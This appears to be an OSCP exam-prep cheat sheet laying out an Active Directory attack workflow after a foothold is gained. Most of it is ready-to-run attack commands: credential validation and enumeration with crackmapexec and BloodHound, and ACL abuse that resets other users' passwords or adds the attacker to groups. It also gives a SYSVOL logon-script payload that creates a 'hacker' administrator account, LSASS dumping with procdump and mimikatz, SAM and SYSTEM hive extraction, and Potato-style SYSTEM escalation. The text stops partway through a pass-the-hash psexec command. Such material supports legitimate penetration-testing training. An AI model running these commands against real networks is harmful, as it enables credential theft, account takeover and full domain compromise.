Post-Credential Active Directory Workflow (OSCP)

Workflow Overview

🔁 Attack Flow


VALIDATE → ENUMERATE → PRIV ESC → LATERAL → DUMP CREDS → DA

🧠 OSCP Mindset

  • Find where the user has access
  • Identify local admin rights
  • Abuse ACLs / GPOs
  • Dump credentials
  • Move laterally
  • Reach Domain Admin
1. Validate Credentials

Validate SMB Authentication


crackmapexec smb IP -u user -p 'Password123!'

Password Policy


crackmapexec smb IP -u user -p 'Password123!' --pass-pol

Goal: Confirm valid domain credentials.

2. Enumeration After Credentials

SMB Shares


crackmapexec smb IP -u user -p 'Password123!' --shares

smbmap -H IP -u user -p 'Password123!'

Domain Users


crackmapexec smb IP -u user -p 'Password123!' --users

Groups


crackmapexec smb IP -u user -p 'Password123!' --groups

BloodHound Collection


bloodhound-python -u user -p 'Password123!' \
-d domain.local \
-dc dc.domain.local \
-c all

What To Look For

  • GenericAll
  • WriteDACL
  • WriteOwner
  • ForceChangePassword
  • AddMember
  • WriteGPO
  • Local Admin rights
3. BloodHound Abuse Cheatsheet

GenericAll

Meaning: Full control over object

If target is USER →

  • Reset password
  • Authenticate as target user

bloodyAD --host DC_IP \
-d domain.local \
-u userA \
-p pass \
set password userB NewPassword123!

If target is GROUP →

  • Add yourself to group

net group "IT Admins" userA /add /domain

Goal: Immediate privilege escalation

WriteDACL

Meaning: Can modify object permissions

Workflow:

  1. Grant yourself GenericAll
  2. Abuse new permissions

Add-DomainObjectAcl \
-TargetIdentity "IT Admins" \
-PrincipalIdentity userA \
-Rights All

Then:


net group "IT Admins" userA /add /domain

Goal: Convert WriteDACL → Full Control

WriteOwner

Meaning: Can take ownership of object

Workflow:

  1. Take ownership
  2. Grant yourself permissions
  3. Abuse object

Set-DomainObjectOwner \
-Identity userB \
-OwnerIdentity userA
            

Add-DomainObjectAcl \
-TargetIdentity userB \
-PrincipalIdentity userA \
-Rights All
            

bloodyAD --host DC_IP \
-d domain.local \
-u userA \
-p pass \
set password userB NewPassword123!

Goal: Full takeover of object

ForceChangePassword

Meaning: Can reset another user's password

Workflow:

  1. Reset password
  2. Login as target user

bloodyAD --host DC_IP \
-d domain.local \
-u userA \
-p pass \
set password userB NewPassword123!

Goal: Immediate account compromise

AddMember

Meaning: Can add users to group

Workflow:

  1. Add yourself to privileged group
  2. Re-authenticate
  3. Use new privileges

net group "IT Admins" userA /add /domain

Goal: Gain group privileges

WriteGPO

Meaning: Can modify Group Policy Object

Workflow:

  1. Create malicious script
  2. Add script to SYSVOL
  3. Wait for policy refresh
  4. Gain SYSTEM execution

Payload location:


\\domain.local\SYSVOL\domain.local\scripts\payload.bat

Payload:


net user hacker Password123! /add
net localgroup administrators hacker /add

Trigger refresh:


gpupdate /force

Goal: SYSTEM execution on domain machines

Local Admin Rights

Meaning: User is administrator on remote machine

Check Access


crackmapexec smb 192.168.1.0/24 \
-u user \
-p 'Password123!'

If you see:


(Pwn3d!)

You are local admin.

Next Steps

  • Dump credentials
  • Pass-the-Hash
  • Lateral movement

impacket-secretsdump domain.local/user:'Password123!'@IP

Goal: Pivot and escalate

4. Windows Privilege Escalation (whoami /priv)

Check Token Privileges


whoami /priv

Dangerous privileges may allow SYSTEM escalation.

SeImpersonatePrivilege

Meaning: Can impersonate tokens

Common Exploits:

  • PrintSpoofer
  • JuicyPotato
  • RoguePotato
  • GodPotato

whoami /priv | findstr SeImpersonatePrivilege

Example:


PrintSpoofer.exe -i -c cmd

Result: SYSTEM shell

SeAssignPrimaryTokenPrivilege

Meaning: Can assign tokens to processes

Exploits:

  • Potato exploits
  • Token impersonation

whoami /priv | findstr SeAssignPrimaryTokenPrivilege

Result: Possible SYSTEM escalation

SeDebugPrivilege

Meaning: Can debug SYSTEM processes

Abuse:

  • Mimikatz
  • Dump LSASS

whoami /priv | findstr SeDebugPrivilege

Dump LSASS:


procdump.exe -ma lsass.exe lsass.dmp

Extract creds:


mimikatz.exe

sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

Result: Credentials / NTLM hashes

SeBackupPrivilege

Meaning: Can bypass file ACLs

Abuse:

  • Read SAM / SYSTEM
  • Read NTDS.dit

whoami /priv | findstr SeBackupPrivilege

Dump registry hives:


reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM

Extract hashes:


impacket-secretsdump -sam SAM -system SYSTEM LOCAL

Result: Local admin hashes

SeRestorePrivilege

Meaning: Can overwrite protected files

Abuse:

  • Replace service binaries
  • Overwrite protected files

Result: Privilege escalation

SeTakeOwnershipPrivilege

Meaning: Can take ownership of files/objects

Abuse:

  • Modify protected files
  • Replace binaries

takeown /f C:\Windows\System32\Utilman.exe

Result: Modify protected resources

Quick Checklist


[ ] whoami /priv
[ ] SeImpersonatePrivilege
[ ] SeAssignPrimaryTokenPrivilege
[ ] SeDebugPrivilege
[ ] SeBackupPrivilege
[ ] SeRestorePrivilege
[ ] SeTakeOwnershipPrivilege

  • Service accounts
  • DA sessions
  • Password reuse

impacket-psexec \
-hashes :NTLM_HASH \
